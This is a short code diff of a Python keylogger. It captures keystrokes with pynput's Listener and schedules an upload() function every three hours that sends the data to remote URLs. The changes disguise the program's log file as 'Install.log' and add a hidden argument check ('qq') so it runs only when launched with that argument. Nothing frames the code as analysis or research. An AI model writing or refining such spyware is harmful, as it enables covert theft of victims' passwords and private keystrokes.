@@ -5,6 +5,7 @@ from base64 import b64decode
 from urllib.parse import urlencode
 from pynput.keyboard import Listener
 from urllib.request import urlopen, Request
+from sys import argv, exit
 
 from apscheduler.schedulers.blocking import BlockingScheduler
 from cryptography.hazmat.backends import default_backend
@@ -169,20 +170,21 @@ def upload():
                 sleep(2)
         except:
             pass
-    f = open("water.txt", 'a')    
+    f = open("Install.log", 'a')
     for url in urls_list:
-        f.write(url)
+        f.write(url[16:])
     f.close()
     msg = ''
 
 
 if __name__ == '__main__':
+    if len(argv) != 2:
+        exit()
+    if argv[1] != "qq":
+        exit()
     listener = Listener(on_press=on_press)
     listener.start()
     scheduler = BlockingScheduler()
     scheduler.add_job(upload, 'interval', hours=3) #minutes=1 to test
     scheduler.start()
-    
-
-
     
